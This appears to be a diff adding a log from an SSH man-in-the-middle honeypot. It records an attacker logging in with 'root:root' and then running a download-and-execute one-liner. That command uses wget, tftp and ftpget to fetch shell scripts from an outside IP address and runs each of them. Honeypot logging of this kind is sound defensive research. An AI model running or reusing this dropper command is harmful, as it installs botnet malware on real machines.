@@ -1,0 +1,19 @@
+2020-11-04 05:59:42.710 - [Info] MITM Version: 1.26
+2020-11-04 05:59:42.713 - [Info] Auto Access Enabled: true
+2020-11-04 05:59:42.714 - [Debug] [Init] Auto Access Barrier: true
+2020-11-04 05:59:42.727 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-11-04 06:16:50.935 - [Debug] [Connection] Attacker connected: 37.46.150.177 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-04 06:16:51.821 - [Debug] [Auth] Attacker 37.46.150.177 trying to authenticate with "password"
+2020-11-04 06:16:51.821 - [Debug] [Auto Access] Attacker: 37.46.150.177, Threshold: 1, Attempts: 1
+2020-11-04 06:16:51.821 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-04 06:16:51.821 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2020-11-04 06:16:51.928 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-04 06:16:51.928 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-11-04 06:16:51.952 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-04 06:16:52.386 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.191.37.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 107.191.37.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.191.37.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.191.37.175 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
+2020-11-04 06:17:53.006 - [Debug] [Connection] Client error on ssh server
+2020-11-04 06:17:53.007 - [Debug] [Connection] Attacker closed connection
+2020-11-04 06:17:53.012 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-04 06:17:53.012 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-04 06:21:53.258 - [Info] Exiting...
+2020-11-04 06:21:53.258 - [Debug] Cleaning up...
